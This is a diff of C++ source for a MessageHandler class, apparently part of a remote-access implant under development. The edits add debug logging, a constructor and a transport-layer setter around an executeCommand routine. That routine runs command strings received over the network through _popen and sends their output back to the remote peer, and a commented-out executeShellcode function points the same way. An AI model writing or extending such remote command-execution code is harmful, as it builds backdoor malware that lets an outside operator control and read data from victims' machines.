@@ -15,20 +15,44 @@
 
 
 
+MessageHandler::MessageHandler()
+	: transportLayer_(nullptr)
+{
+	std::cout << "inside messagehandler default constructor" << std::endl;
+}
+
+MessageHandler::~MessageHandler()
+{
+	std::cout << "messagehandler deconstructor" << std::endl;
+}
+
 bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 {
+	std::cout << "=== EXECUTE COMMAND START ===" << std::endl;
 	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;
-
 
 
 	// TODO: instead add result into the queue, and have transporter send them all when ready?
 	// TODO: if the original (identified by the messageId) incoming internalMessage was marked as high priority, 
 	//		 then skip the queue and send the message immediately 
 
-	
+	std::cout << "transportLayer_ pointer: " << transportLayer_ << std::endl;
+	if (!transportLayer_)
+	{
+		std::cout << "ERROR: transportLayer_ is NULL!" << std::endl;
+		return false;
+	}
+	// Check if we can access the transport layer
+	std::cout << "TransportLayer connected: " << transportLayer_->isConnected() << std::endl;
+	// Test: Call a simple method on transportLayer_
+	std::cout << "Testing transportLayer_ access..." << std::endl;
+	bool test = transportLayer_->isConnected();  // Simple method call
+	std::cout << "Test call successful: " << test << std::endl;
 
 	std::string command = byte2string(data).c_str();
 	std::string result;
+	
+
 
 	// EASIEST METHOD - just use _popen directly
 	FILE* pipe = _popen(command.c_str(), "r");
@@ -49,18 +73,29 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
 	std::cout << result << std::endl;
 
+	std::cout << "Command result size: " << result.size() << std::endl;
+	std::cout << "Command result: " << result << std::endl;
+
 	// TODO: props should make a separate function for InternalMessage generation
 	InternalMessage outMsg;
 	outMsg.data = string2byte(result);
+	std::cout << "outMsg.data size: " << outMsg.data.size() << std::endl;
+	std::cout << "outMsg.data valid: " << !outMsg.data.empty() << std::endl;
+
 	MessageHeader header;
 	header.messageType = MessageType::COMMAND_RESULT;
 	header.messageId = 105; // TODO: 
 	header.dataSize = outMsg.data.size();
-
+	std::cout << "Header - type: " << static_cast<int>(header.messageType)
+		<< ", id: " << header.messageId
+		<< ", dataSize: " << header.dataSize << std::endl;
 	outMsg.header = header;
+	std::cout << "About to call sendMessage..." << std::endl;
+	bool sendResult = transportLayer_->sendMessage(outMsg);
+	std::cout << "sendMessage result: " << sendResult << std::endl;
 
-	return transportLayer_->sendMessage(outMsg);
-
+	std::cout << "=== EXECUTE COMMAND END ===" << std::endl;
+	return sendResult;
 }
 
 //bool MessageHandler::executeShellcode(std::vector<uint8_t>& data)
@@ -132,6 +167,7 @@ bool MessageHandler::handleServerError(std::vector<uint8_t>& data)
 	return false;
 }
 
+// TODO: something about this function corruprts the memory
 void MessageHandler::processMessage(InternalMessage& msg)
 {
 	switch (msg.header.messageType)
@@ -170,6 +206,11 @@ void MessageHandler::processMessage(InternalMessage& msg)
 void MessageHandler::sendQueuedMessages()
 {
 	std::cout << "sendQueuedMessages... not implemented" << std::endl;
+}
+
+void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
+{
+	transportLayer_ = &transportLayer;
 }
 
 /*
